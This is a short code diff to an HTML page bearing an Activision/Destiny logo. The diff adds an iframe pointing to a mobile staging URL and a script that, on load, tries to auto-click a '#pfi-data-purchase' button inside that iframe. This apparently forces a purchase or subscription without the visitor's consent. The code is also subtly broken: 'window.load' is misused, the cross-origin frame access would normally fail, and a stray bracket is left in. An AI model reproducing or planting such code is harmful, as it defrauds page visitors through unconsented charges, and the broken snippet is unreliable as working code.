@@ -106,8 +106,16 @@ function myFunction() {
 }       
 </script>
 <br>
+    <div id="OutDiv" class="outerdiv">
+    <iframe src="http://staging.octoray.mobi/staging/100.php" id="InnerIframe"></iframe>
+</div>
 
-
+    <script>
+    window.load(function(){
+   $('#InnerIframe').contents().find('#pfi-data-purchase').trigger( "click" );
+});
+</script>]
+    
 <div class="footer" id="footer">
     <br>
     <img src="https://www.destinythegame.com/content/dam/atvi/global/firstparty/activision/activision-logo.svg"  class="foot_logo" alt="Header"><br><br>
